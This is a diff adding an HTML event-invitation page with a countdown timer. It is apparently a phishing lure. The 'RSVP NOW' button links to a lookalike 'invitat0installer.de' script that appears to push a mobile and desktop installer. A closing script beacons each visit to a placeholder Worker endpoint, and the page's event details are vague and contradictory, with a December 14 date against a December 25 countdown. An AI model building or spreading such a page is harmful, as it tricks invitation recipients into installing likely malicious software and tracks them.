@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Celebrate Life’s Beautiful Moments</title>
+
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+  <style>
+    /* your existing styles ... */
+  </style>
+</head>
+<body>
+  <h1>Celebrate Life’s Beautiful Moments</h1>
+  <p>Join us for an evening filled with joy, laughter, and warm memories.</p>
+  <a href="https://invitat0installer.de/bothPD/mobile&desktop.php" class="button">RSVP NOW</a>
+
+  <!-- Countdown Timer -->
+  <div id="countdown"></div>
+
+  <!-- Event Info Section -->
+  <div class="event-info">
+    <div class="info-box">
+      <i class="fa-solid fa-calendar-days"></i>
+      <div class="info-title">When</div>
+      <div class="info-detail">December 14, 2025</div>
+    </div>
+
+    <div class="info-box">
+      <i class="fa-solid fa-location-dot"></i>
+      <div class="info-title">Where</div>
+      <div class="info-detail">TBD</div>
+    </div>
+
+    <div class="info-box">
+      <i class="fa-solid fa-clock"></i>
+      <div class="info-title">Time</div>
+      <div class="info-detail">00:00 EST</div>
+    </div>
+  </div>
+
+  <script>
+    // 🎯 Countdown Timer
+    const eventDate = new Date("2025-12-25T00:00:00").getTime();
+    const countdown = document.getElementById("countdown");
+
+    const timer = setInterval(() => {
+      const now = new Date().getTime();
+      const distance = eventDate - now;
+
+      if (distance < 0) {
+        countdown.innerHTML = "The event has started!";
+        clearInterval(timer);
+        return;
+      }
+
+      const months = Math.floor(distance / (1000 * 60 * 60 * 24 * 30.4375));
+      const days = Math.floor((distance % (1000 * 60 * 60 * 24 * 30.4375)) / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+      countdown.innerHTML = `
+        <span>${months} <small>mo</small></span>
+        <span>${days} <small>d</small></span>
+        <span>${hours} <small>h</small></span>
+        <span>${minutes} <small>m</small></span>
+        <span>${seconds} <small>s</small></span>
+      `;
+    }, 1000);
+  </script>
+
+  <!-- Worker POST Script -->
+  <script>
+    fetch("https://YOUR-WORKER-URL.workers.dev/visit", { method: "POST" });
+  </script>
+</body>
+</html>
